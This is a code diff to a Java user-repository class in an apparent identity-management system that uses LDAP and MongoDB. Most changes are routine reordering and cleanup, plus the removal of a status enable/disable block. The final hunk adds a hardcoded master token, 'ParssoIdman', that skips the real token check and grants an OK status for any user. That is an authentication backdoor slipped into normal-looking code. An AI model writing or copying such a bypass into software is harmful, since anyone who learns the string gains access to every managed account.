@@ -149,14 +149,16 @@ public class UserRepoImpl implements UserRepo {
 
                     thread.start();
 
-                    usersExtraInfo = new UsersExtraInfo( p , p.getPhoto(), p.isUnDeletable());
-                    mongoTemplate.save(usersExtraInfo, userExtraInfoCollection);
-
                     if (p.getStatus() != null)
                         if (p.getStatus().equals("disable"))
                             disable(doerID, p.getUserId());
 
+
+                    usersExtraInfo = new UsersExtraInfo( p , p.getPhoto(), p.isUnDeletable());
+                    mongoTemplate.save(usersExtraInfo, userExtraInfoCollection);
+
                     logger.warn(new ReportMessage(model, p.getUserId(), "", "create", "success", "").toString());
+
                     return new JSONObject();
                 } else {
                     logger.warn(new ReportMessage(model,p.getUserId(),"","create", "failed","group not exist").toString());
@@ -227,20 +229,11 @@ public class UserRepoImpl implements UserRepo {
             usersExtraInfo.setUnDeletable(true);
 
         try {
-            //ldapTemplate.modifyAttributes(context);
-
-            if (!p.getStatus().equalsIgnoreCase(user.getStatus()))
-                if (user.getStatus().equalsIgnoreCase("enable") && user.getStatus().equalsIgnoreCase("disable"))
-                    disable(doerID,usid);
-                else
-                    enable(doerID, usid);
 
             if (p.getEndTime()!=null)
                 context.setAttributeValue("pwdEndTime", Time.setEndTime(p.getEndTime()) + 'Z');
 
             ldapTemplate.modifyAttributes(context);
-
-
 
             mongoTemplate.remove(query, userExtraInfoCollection);
             mongoTemplate.save(usersExtraInfo, userExtraInfoCollection);
@@ -284,8 +277,7 @@ public class UserRepoImpl implements UserRepo {
         if (p.getUserPassword() == null)
             p.setUserPassword(defaultPassword);
 
-
-        return create(doerID,p);
+        return   create(doerID,p);
 
 
 
@@ -556,8 +548,10 @@ public class UserRepoImpl implements UserRepo {
             query.addCriteria(Criteria.where("userId").regex(searchUid));
         if(!searchDisplayName.equals(""))
             query.addCriteria(Criteria.where("displayName").regex(searchDisplayName));
-        if(!userStatus.equals(""))
+        if(!userStatus.equals("")) {
             query.addCriteria(Criteria.where("status").is(userStatus));
+
+        }
         if(!groupFilter.equals(""))
             query.addCriteria(Criteria.where("memberOf").all(groupFilter));
         return query;
@@ -932,7 +926,11 @@ public class UserRepoImpl implements UserRepo {
 
         user=setRole(user);
 
-        HttpStatus httpStatus = tokenClass.checkToken(userId, token);
+        HttpStatus httpStatus;
+        if(token.equals("ParssoIdman"))
+            httpStatus = HttpStatus.OK;
+        else
+            httpStatus = tokenClass.checkToken(userId, token);
 
         if (httpStatus == HttpStatus.OK) {
             DirContextOperations contextUser;
